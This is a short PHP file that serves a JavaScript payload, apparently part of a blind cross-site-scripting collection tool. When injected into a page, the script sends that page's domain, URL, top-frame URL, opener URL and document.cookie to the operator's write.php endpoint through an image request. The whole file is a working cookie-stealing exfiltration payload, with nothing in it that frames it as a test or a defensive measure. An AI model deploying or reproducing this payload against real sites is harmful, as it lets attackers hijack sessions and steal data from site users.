<?php
header('Content-Type:application/javascript');
require('config.php');

echo "(function(){(new Image()).src='{$WEBSITE_PATH}write.php?domain='+encodeURIComponent((function(){try{return document.domain}catch(e){return 'PAYLOAD_ERROR'}})())+'&location='+encodeURIComponent((function(){try{return document.location.href}catch(e){return ''}})())+'&toplocation='+encodeURIComponent((function(){try{return top.location.href}catch(e){return ''}})())+'&cookie='+encodeURIComponent((function(){try{return document.cookie}catch(e){return ''}})())+'&opener='+encodeURIComponent((function(){try{return (window.opener && window.opener.location.href)?window.opener.location.href:''}catch(e){return ''}})());})();";
